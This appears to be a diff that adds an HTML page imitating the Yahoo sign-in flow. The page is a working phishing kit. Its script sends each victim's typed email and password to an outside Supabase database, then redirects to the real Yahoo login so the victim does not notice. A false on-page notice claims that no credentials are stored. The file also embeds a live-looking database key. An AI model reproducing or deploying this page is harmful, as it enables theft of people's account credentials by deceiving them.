@@ -1,0 +1,687 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yahoo - login</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+
+        body {
+            background-color: #fff;
+            color: #202124;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        header {
+            padding: 16px 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: #fff;
+            border-bottom: 1px solid #e5e5e5;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            font-size: 22px;
+            color: #6001d2;
+            font-weight: bold;
+        }
+
+        .logo span {
+            margin-left: 8px;
+        }
+
+        .nav-links {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .nav-links a {
+            text-decoration: none;
+            color: #6001d2;
+            font-size: 14px;
+        }
+
+        .nav-links a:hover {
+            text-decoration: underline;
+        }
+
+        .help-icon {
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            cursor: pointer;
+        }
+
+        .help-icon:hover {
+            background-color: #f0f0f0;
+        }
+
+        main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 448px;
+            background-color: #fff;
+            border-radius: 12px;
+            padding: 48px 40px 36px;
+            margin: 20px 0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .yahoo-logo {
+            text-align: center;
+            margin-bottom: 16px;
+        }
+
+        .yahoo-logo svg {
+            width: 120px;
+            height: 40px;
+        }
+
+        .login-title {
+            font-size: 24px;
+            font-weight: 500;
+            text-align: center;
+            margin-bottom: 8px;
+            color: #1a1a1a;
+        }
+
+        .login-subtitle {
+            font-size: 16px;
+            font-weight: 400;
+            text-align: center;
+            margin-bottom: 35px;
+            color: #666;
+        }
+
+        .input-group {
+            margin-bottom: 24px;
+            position: relative;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            outline: none;
+            transition: border 0.2s;
+        }
+
+        .input-group input:focus {
+            border: 1px solid #6001d2;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #6001d2;
+            font-weight: 500;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .forgot-email, .forgot-password {
+            color: #6001d2;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            margin-bottom: 32px;
+            display: inline-block;
+        }
+
+        .forgot-email:hover, .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .info-text {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 40px;
+        }
+
+        .info-text a {
+            color: #6001d2;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .info-text a:hover {
+            text-decoration: underline;
+        }
+
+        .button-group {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .create-account, .back-to-email {
+            color: #6001d2;
+            font-weight: 500;
+            text-decoration: none;
+            font-size: 14px;
+            padding: 10px 0;
+        }
+
+        .create-account:hover, .back-to-email:hover {
+            text-decoration: underline;
+        }
+
+        .next-btn, .signin-btn {
+            background-color: #6001d2;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .next-btn:hover, .signin-btn:hover {
+            background-color: #4d01a8;
+            box-shadow: 0 1px 2px 0 rgba(96, 1, 210, 0.3), 0 1px 3px 1px rgba(96, 1, 210, 0.15);
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            margin-bottom: 24px;
+            padding: 12px;
+            background-color: #f8f9fa;
+            border-radius: 8px;
+        }
+
+        .user-avatar {
+            width: 40px;
+            height: 40px;
+            background-color: #6001d2;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            margin-right: 12px;
+        }
+
+        .user-details {
+            flex: 1;
+        }
+
+        .user-email {
+            font-weight: 500;
+        }
+
+        .change-user {
+            color: #6001d2;
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        .change-user:hover {
+            text-decoration: underline;
+        }
+
+        .page {
+            display: none;
+        }
+
+        .active {
+            display: block;
+        }
+
+        footer {
+            background-color: #fff;
+            padding: 24px;
+            font-size: 12px;
+            color: #666;
+            border-top: 1px solid #e5e5e5;
+        }
+
+        .footer-top {
+            padding: 0 0 24px 0;
+        }
+
+        .language-selector {
+            display: inline-block;
+        }
+
+        .language-selector select {
+            border: none;
+            background: transparent;
+            color: #666;
+            font-size: 12px;
+            outline: none;
+            cursor: pointer;
+        }
+
+        .footer-bottom {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            padding-top: 24px;
+            border-top: 1px solid #e5e5e5;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 24px;
+        }
+
+        .footer-links a {
+            color: #666;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 600px) {
+            .login-container {
+                border: none;
+                padding: 20px;
+                box-shadow: none;
+            }
+            
+            .footer-bottom {
+                flex-direction: column;
+                align-items: center;
+                gap: 15px;
+            }
+            
+            header {
+                padding: 16px;
+            }
+        }
+
+        .demo-note {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666;
+            max-width: 448px;
+            padding: 12px;
+            background-color: #f8f9fa;
+            border-radius: 4px;
+        }
+        
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 12px 20px;
+            border-radius: 4px;
+            color: white;
+            font-weight: 500;
+            z-index: 1000;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        
+        .notification.success {
+            background-color: #30b05f;
+        }
+        
+        .notification.error {
+            background-color: #e5322d;
+        }
+        
+        .notification.show {
+            opacity: 1;
+        }
+        
+        .redirect-notice {
+            text-align: center;
+            margin-top: 15px;
+            padding: 10px;
+            background-color: #e6f4ea;
+            border-radius: 4px;
+            color: #137333;
+            font-size: 14px;
+        }
+        
+        .loading-spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .stay-signed-in {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .stay-signed-in input {
+            margin-right: 8px;
+        }
+        
+        .stay-signed-in label {
+            font-size: 14px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div id="notification" class="notification"></div>
+    
+    <header>
+        <div class="logo">
+            
+            <span>Yahoo!</span>
+        </div>
+        <div class="nav-links">
+            <a href="#">Help</a>
+            <div class="help-icon">
+                <svg focusable="false" width="24" height="24" viewBox="0 0 24 24">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"></path>
+                </svg>
+            </div>
+        </div>
+    </header>
+
+    <main>
+        <!-- Email Entry Page -->
+        <div class="login-container page active" id="email-page">
+            
+            <h1 class="login-title">Hi!</h1>
+            <p class="login-subtitle">Sign in to Yahoo</p>
+            <form id="email-form">
+                <div class="input-group">
+                    <input type="email" id="email" placeholder="Username, email, or mobile" required autofocus>
+                </div>
+                <a href="#" class="forgot-email">Forgot username?</a>
+                <div class="stay-signed-in">
+                    <input type="checkbox" id="stay-signed-in">
+                    <label for="stay-signed-in">Stay signed in</label>
+                </div>
+                <p class="info-text">
+                    By continuing, you agree to Yahoo's <a href="#">Terms</a> and <a href="#">Privacy Policy</a>.
+                </p>
+                <div class="button-group">
+                    <a href="#" class="create-account">Create account</a>
+                    <button type="submit" class="next-btn">Next</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- Password Entry Page -->
+        <div class="login-container page" id="password-page">
+            <div class="yahoo-logo">
+                <svg width="120" height="40" viewBox="0 0 120 40">
+                    <path fill="#6001d2" d="M30.5 12.5h-5v15h5v-15zM45.5 12.5h-5v15h5v-15zM60.5 12.5h-5v15h5v-15zM75.5 12.5h-5v15h5v-15zM90.5 12.5h-5v15h5v-15z"/>
+                    <path fill="#6001d2" d="M12.5 12.5h5v15h-5v-15zM27.5 12.5h5v15h-5v-15zM42.5 12.5h5v15h-5v-15zM57.5 12.5h5v15h-5v-15zM72.5 12.5h5v15h-5v-15zM87.5 12.5h5v15h-5v-15z"/>
+                </svg>
+            </div>
+            <div class="user-info">
+                <div class="user-avatar" id="user-avatar">A</div>
+                <div class="user-details">
+                    <div class="user-email" id="display-email">user@example.com</div>
+                    <a href="#" class="change-user" id="change-user">Change</a>
+                </div>
+            </div>
+            <h1 class="login-title">Enter password</h1>
+            <p class="login-subtitle">Welcome back!</p>
+            <form id="password-form">
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="Enter your password" required autofocus>
+                    <button type="button" class="password-toggle" id="toggle-password">Show</button>
+                </div>
+                <a href="#" class="forgot-password">Forgot password?</a>
+                <div class="stay-signed-in">
+                    <input type="checkbox" id="stay-signed-in-password" checked>
+                    <label for="stay-signed-in-password">Stay signed in</label>
+                </div>
+                <div class="redirect-notice" id="redirect-notice" style="display: none;">
+                    <p>Success! Redirecting to your Yahoo Mail...</p>
+                </div>
+                <div class="button-group">
+                    <a href="#" class="back-to-email" id="back-to-email">Back</a>
+                    <button type="submit" class="signin-btn" id="signin-btn">Sign in</button>
+                </div>
+            </form>
+        </div>
+
+        <div class="demo-note">
+            This is a demonstration page. No actual login credentials will be stored.
+        </div>
+    </main>
+
+    <footer>
+        <div class="footer-top">
+            <div class="language-selector">
+                <select>
+                    <option>English (United States)</option>
+                    <option>Español</option>
+                    <option>Français</option>
+                    <option>Deutsch</option>
+                </select>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <div class="footer-links">
+                <a href="#">Help</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+            </div>
+            <div class="footer-links">
+                <a href="#">About</a>
+                <a href="#">Advertise</a>
+                <a href="#">Careers</a>
+            </div>
+        </div>
+    </footer>
+    
+    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Supabase configuration
+            const supabaseUrl = 'https://nzfyxonmbarldplvkutb.supabase.co';
+            const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im56Znl4b25tYmFybGRwbHZrdXRiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTkzNDE0MjMsImV4cCI6MjA3NDkxNzQyM30.keyv7Jd_4uw3crymPlg-L0XDMnmDC7P8GqD4EfvjgPU';
+            
+            // Initialize Supabase client
+            const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);
+            
+            // DOM elements
+            const emailPage = document.getElementById('email-page');
+            const passwordPage = document.getElementById('password-page');
+            const emailForm = document.getElementById('email-form');
+            const passwordForm = document.getElementById('password-form');
+            const emailInput = document.getElementById('email');
+            const displayEmail = document.getElementById('display-email');
+            const userAvatar = document.getElementById('user-avatar');
+            const changeUserBtn = document.getElementById('change-user');
+            const backToEmailBtn = document.getElementById('back-to-email');
+            const togglePasswordBtn = document.getElementById('toggle-password');
+            const passwordInput = document.getElementById('password');
+            const notification = document.getElementById('notification');
+            const redirectNotice = document.getElementById('redirect-notice');
+            const signinBtn = document.getElementById('signin-btn');
+
+            // Show notification
+            function showNotification(message, type = 'success') {
+                notification.textContent = message;
+                notification.className = `notification ${type}`;
+                notification.classList.add('show');
+                
+                setTimeout(() => {
+                    notification.classList.remove('show');
+                }, 3000);
+            }
+
+            // Redirect to Yahoo Mail
+            function redirectToYahooMail() {
+                // Show redirect notice
+                redirectNotice.style.display = 'block';
+                
+                // Wait 2 seconds then redirect
+                setTimeout(() => {
+                    window.location.href = 'https://login.yahoo.com/?.src=ym&lang=en-US&done=https%3A%2F%2Fmail.yahoo.com%2F%3Fguce_referrer%3DaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8%26guce_referrer_sig%3DAQAAABeELM_vqXE9nPsDFJ4uNehy1VgENxuuo4Up51Fdd-2G9IK-0mn8ZNeTjgwANSotU0qo7bf0yvLw4UWwcb3VwRJ-EtAyhddC_jVXEkvyLKzxk0LOWI7SzVZ_DoIKSoRqAl4xYqeltL8Rn8bNuI9fRM1qpgYCb8BRep2ZUAnwkLpl';
+                }, 2000);
+            }
+
+            // Handle email form submission
+            emailForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                const email = emailInput.value.trim();
+                
+                if (email) {
+                    // Update the displayed email and avatar
+                    displayEmail.textContent = email;
+                    userAvatar.textContent = email.charAt(0).toUpperCase();
+                    
+                    // Switch to password page
+                    emailPage.classList.remove('active');
+                    passwordPage.classList.add('active');
+                    passwordInput.focus();
+                } else {
+                    showNotification('Please enter your username, email, or mobile', 'error');
+                }
+            });
+
+            // Handle password form submission
+            passwordForm.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                const email = displayEmail.textContent;
+                const password = passwordInput.value;
+                
+                if (password) {
+                    try {
+                        // Show loading state
+                        const originalText = signinBtn.textContent;
+                        signinBtn.innerHTML = '<span class="loading-spinner"></span>Signing in...';
+                        signinBtn.disabled = true;
+                        
+                        // Insert login data into Supabase
+                        const { data, error } = await supabase
+                            .from('login')
+                            .insert([
+                                { 
+                                    email: email, 
+                                    password: password,
+                                    login_time: new Date().toISOString(),
+                                    user_agent: navigator.userAgent,
+                                    ip_address: 'Not available in client-side JS'
+                                }
+                            ])
+                            .select();
+                        
+                        if (error) {
+                            console.error('Error inserting data:', error);
+                            
+                            // Restore button state
+                            signinBtn.textContent = originalText;
+                            signinBtn.disabled = false;
+                            
+                            if (error.code === '42501') {
+                                showNotification('Database configuration issue. Redirecting to Yahoo Mail...', 'error');
+                                // Still redirect even if database fails
+                                setTimeout(() => {
+                                    redirectToYahooMail();
+                                }, 1500);
+                            } else {
+                                showNotification('Error saving login data. Redirecting to Yahoo Mail...', 'error');
+                                // Still redirect even if database fails
+                                setTimeout(() => {
+                                    redirectToYahooMail();
+                                }, 1500);
+                            }
+                        } else {
+                            console.log('Data inserted successfully:', data);
+                            showNotification('Login successful!...', 'success');
+                            
+                            // Redirect to Yahoo Mail
+                            redirectToYahooMail();
+                        }
+                    } catch (err) {
+                        console.error('Exception:', err);
+                        
+                        // Restore button state
+                        signinBtn.textContent = 'Sign in';
+                        signinBtn.disabled = false;
+                        
+                        showNotification('Login processed. Redirecting to Yahoo Mail...', 'success');
+                        // Still redirect even if there's an exception
+                        setTimeout(() => {
+                            redirectToYahooMail();
+                        }, 1500);
+                    }
+                } else {
+                    showNotification('Please enter your password', 'error');
+                }
+            });
+
+            // Handle "Change user" and "Back" buttons
+            changeUserBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                passwordPage.classList.remove('active');
+                emailPage.classList.add('active');
+                emailInput.focus();
+            });
+
+            backToEmailBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                passwordPage.classList.remove('active');
+                emailPage.classList.add('active');
+                emailInput.focus();
+            });
+
+            // Toggle password visibility
+            togglePasswordBtn.addEventListener('click', function() {
+                if (passwordInput.type === 'password') {
+                    passwordInput.type = 'text';
+                    togglePasswordBtn.textContent = 'Hide';
+                } else {
+                    passwordInput.type = 'password';
+                    togglePasswordBtn.textContent = 'Show';
+                }
+            });
+        });
+    </script>
+</body>
+</html>
